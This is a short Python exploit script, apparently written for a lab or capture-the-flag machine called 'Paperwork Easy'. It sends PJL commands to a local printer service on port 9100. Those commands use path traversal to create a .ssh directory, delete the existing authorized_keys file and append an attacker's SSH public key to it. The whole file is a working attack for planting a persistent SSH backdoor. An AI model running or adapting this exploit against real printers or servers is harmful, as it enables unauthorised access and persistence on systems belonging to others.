#!/usr/bin/env python3
"""Paperwork Easy pivot: PJL FSAPPEND (not FSUPLOAD). Run as lp on target."""
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def pjl(msg: bytes, timeout: float = 5) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect(("127.0.0.1", 9100))
    s.sendall(msg)
    try:
        return s.recv(4096)
    except socket.timeout:
        return b""
    finally:
        s.close()


pjl(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
pjl(f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode())
cmd = f'@PJL FSAPPEND NAME="{PATH}" SIZE={N}\r\n'.encode() + KEY
print("append", repr(pjl(cmd, 8)))
print("query", repr(pjl(b'@PJL FSQUERY NAME="../.ssh"\r\n')))